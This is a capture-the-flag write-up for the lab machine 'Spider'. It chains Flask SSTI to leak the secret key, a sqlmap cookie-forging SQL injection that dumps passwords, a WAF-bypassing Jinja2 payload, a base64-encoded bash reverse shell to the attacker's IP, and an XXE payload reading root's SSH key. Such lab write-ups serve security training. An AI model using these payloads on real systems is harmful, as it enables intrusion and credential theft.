---
permalink: /spider
layout: post
author: InfoSecJack & chivato
title: Writeup
date: 2021-10-24
publish: True
description: "Spider is a hard difficulty Linux machine which focuses on web-based injection attacks. Server-Side Template Injection (SSTI) is first exploited to read the config object of a Flask application and obtain the SECRET_KEY string, which can be used to sign and verify session cookies. An SQL injection attack carried through forged cookies allows attackers to retrieve login data from the database and gain administrative access to the web application. A second SSTI vulnerability is found in a support ticket portal. Exploiting this vulnerability, which requires bypassing a Web Application Firewall, results in arbitrary code execution and ultimately in an interactive shell on the system. Privileges can then be escalated by exploiting an XML External Entity (XXE) injection vulnerability in a beta web application running locally,
"
---

# Enumeration

Nmap

```bash
sudo nmap -sC -sV -oA nmap/spider 10.10.10.243

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA)
|   256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA)
|_  256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://spider.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.81 seconds

```

Add spider.htb to /etc/hosts file

![](/Writeups/Spider/Pasted image 20211023205658.png)

Registering new user

![](/Writeups/Spider/Pasted image 20211023210019.png)

![](/Writeups/Spider/Pasted image 20211023210948.png)

Created user as {{config}} for SSTI, because config exist for every server

![](/Writeups/Spider/Pasted image 20211023211119.png)

got details of the file config

![](/Writeups/Spider/Pasted image 20211023211149.png)

## config

```php

<Config {'ENV': 'production'
 'DEBUG': False
 'TESTING': False
 'PROPAGATE_EXCEPTIONS': None
 'PRESERVE_CONTEXT_ON_EXCEPTION': None
 'SECRET_KEY': 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942'
 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31)
 'USE_X_SENDFILE': False
 'SERVER_NAME': None
 'APPLICATION_ROOT': '/'
 'SESSION_COOKIE_NAME': 'session'
 'SESSION_COOKIE_DOMAIN': False
 'SESSION_COOKIE_PATH': None
 'SESSION_COOKIE_HTTPONLY': True
 'SESSION_COOKIE_SECURE': False
 'SESSION_COOKIE_SAMESITE': None
 'SESSION_REFRESH_EACH_REQUEST': True
 'MAX_CONTENT_LENGTH': None
 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0
 43200)
 'TRAP_BAD_REQUEST_ERRORS': None
 'TRAP_HTTP_EXCEPTIONS': False
 'EXPLAIN_TEMPLATE_LOADING': False
 'PREFERRED_URL_SCHEME': 'http'
 'JSON_AS_ASCII': True
 'JSON_SORT_KEYS': True
 'JSONIFY_PRETTYPRINT_REGULAR': False
 'JSONIFY_MIMETYPE': 'application/json'
 'TEMPLATES_AUTO_RELOAD': None
 'MAX_COOKIE_SIZE': 4093
 'RATELIMIT_ENABLED': True
 'RATELIMIT_DEFAULTS_PER_METHOD': False
 'RATELIMIT_SWALLOW_ERRORS': False
 'RATELIMIT_HEADERS_ENABLED': False
 'RATELIMIT_STORAGE_URL': 'memory://'
 'RATELIMIT_STRATEGY': 'fixed-window'
 'RATELIMIT_HEADER_RESET': 'X-RateLimit-Reset'
 'RATELIMIT_HEADER_REMAINING': 'X-RateLimit-Remaining'
 'RATELIMIT_HEADER_LIMIT': 'X-RateLimit-Limit'
 'RATELIMIT_HEADER_RETRY_AFTER': 'Retry-After'
 'UPLOAD_FOLDER': 'static/uploads'}>
```

On googling parameters we can find something related to flask.

## Flask Unsigned cookie

Unsigning cookie using flask

https://book.hacktricks.xyz/pentesting/pentesting-web/flask#flask-unsign

Sql-inject with flask_unsign.

https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap#eval

```bash

sqlmap http://spider.htb --eval "from flask_unsign import session as s; session = s.sign({'uuid': session}, secret='Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942')" --cookie="session=*" --dump

```

```sql
+----+--------------------------------------+------------+-----------------+
| id | uuid                                 | name       | password        |
+----+--------------------------------------+------------+-----------------+
| 1  | 129f60ea-30cf-4065-afb9-6be45ad38b73 | chiv       | ch1VW4sHERE7331 |
| 2  | 05c31009-d105-41bd-bf71-d1bdacf5a2ee | aaa        | 12345           |
| 3  | 539619f4-cf01-451f-8b1e-f3c392cec0b6 | {{7*7}}    | 12345           |
| 4  | 05b87d4f-91cd-448a-8db3-15783f9526dc | {{config}} | 12345           |
| 5  | 6bee5cc6-928a-4371-8d9b-007c2b760243 | nullbyte   | Qwertyasd$      |
| 6  | d694bef9-793b-4cb2-95d8-9a449243cd1e | {{config}} | 123             |
| 7  | 85085523-c4c7-4a5d-887a-69f2216ec268 | {{config}} | fDtyA4W5q7T22c8 |
+----+--------------------------------------+------------+-----------------+


```

# Admin

Signing in as admin using chiv's uuid and password obtained from sqlmap.

![](/Writeups/Spider/Pasted image 20211023214517.png)

After loggin in we can find a unfinished support portal.

![](/Writeups/Spider/Pasted image 20211023214637.png)

![](/Writeups/Spider/Pasted image 20211023214926.png)

After a while trail and error found bad characters which are blocking by WAF. Executing [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---filter-bypass)after escaping bad character.

```python

\{% include request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("sleep 2")|attr("read")() %}

```

![](/Writeups/Spider/Pasted image 20211023220907.png)

Got a reverse shell

```bash

{% include request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("echo+YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjEzOC85MDAxIDA%2bJjEK+|+base64+-d+|+bash")|attr("read")() %}
```

![](/Writeups/Spider/Pasted image 20211024081248.png)

tty shell

```bash

python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + z
stty raw -echo;fg
Enter Enter
export TERM=xterm


```

Copy id_rsa of chiv

![](/Writeups/Spider/Pasted image 20211024081815.png)

# User

![](/Writeups/Spider/Pasted image 20211024081935.png)

another server run in port 8080

![](/Writeups/Spider/Pasted image 20211024082027.png)

we can forward the port to our machine using following commands

```bash

shift +~+C
-L 8081:127.0.0.1:8080

```

![](/Writeups/Spider/Pasted image 20211024082358.png)

![](/Writeups/Spider/Pasted image 20211024082508.png)

Intersecpt the request in burpsuite and replace data in request with follow to get id_rsa

```xml

username=%26username%3b&version=1.0.0--><!DOCTYPE+foo+[<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--

```

# Root

![](/Writeups/Spider/Pasted image 20211024090436.png)

copy id_rsa and change permission

```bash

chmod 600 id_rsa

```

![](/Writeups/Spider/Pasted image 20211024093237.png)
